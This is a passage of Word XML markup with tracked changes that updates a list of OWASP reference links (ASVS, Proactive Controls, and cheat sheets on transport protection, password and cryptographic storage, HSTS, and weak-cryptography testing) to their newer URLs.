      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="917"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918" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/OWASP_Proactive_Controls#7:_Protect_Data)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="919" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">www-project-proactive-controls/v3/en/c8-protect-data-everywhere) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7C333D67" w14:textId="73FA5EFD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="920" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="921"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Application Security Verification Standard</w:t>
      </w:r>
      <w:del w:id="922" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>]((</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="923" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> (V7, 9, 10)](</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="924"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925" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/Category:OWASP_Application_Security_Verification_Standard_Project)): [V7](https://www.owasp.org/index.php/ASVS_V7_Cryptography), [9](https://www.owasp.org/index.php/ASVS_V9_Data_Protection), [10](https://www.owasp.org/index.php/ASVS_V10_Communications)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="926" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-application-security-verification-standard) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="54C78E34" w14:textId="04DE3E64" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="927" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="928"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Transport Layer </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Protection](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="929" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="930"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931" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="932" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Transport_Layer_Protection_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="933" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="934" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="06A74F6A" w14:textId="467C1916" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="935" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="936"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User Privacy </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Protection](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="937" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="938"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939" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="940" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/User_Privacy_Protection_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="941" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="942" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B9E45E9" w14:textId="392D99ED" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="943" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="944" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="945"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Password</w:t>
      </w:r>
      <w:ins w:id="946" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Storage</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="947" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="948"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949" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="950" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Password_Storage_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="951" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>) and [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="952" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61ECE285" w14:textId="6AF7FECB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="953" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP Cheat Sheet: </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cryptographic </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Storage](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="954" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="955" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheetseries</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.owasp.org/</w:t>
      </w:r>
      <w:del w:id="956" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="957" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Cryptographic_Storage_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="958" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="959" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57BAF137" w14:textId="4B5F1024" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="960" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="961"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w:t>
      </w:r>
      <w:del w:id="962" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Security Headers Project](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project); [</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cheat Sheet: </w:t>
      </w:r>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>HSTS](https://</w:t>
      </w:r>
      <w:del w:id="963" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="964"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965" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="966" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/HTTP_Strict_Transport_Security_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="967" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="968" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39C4B036" w14:textId="5F7FACD9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="969" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="970"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Testing Guide: Testing for weak </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cryptography</w:t>
      </w:r>
      <w:ins w:id="971" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(https://</w:t>
      </w:r>
      <w:del w:id="972"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973" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="974" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing_for_</w:t>
      </w:r>
      <w:del w:id="975" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>weak</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="976" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Weak</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>_Cryptography</w:t>
      </w:r>
      <w:del w:id="977" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="978" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">/README) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="49A8CA4E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4016D97A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="979" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="980" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="47A1E33A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="981" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
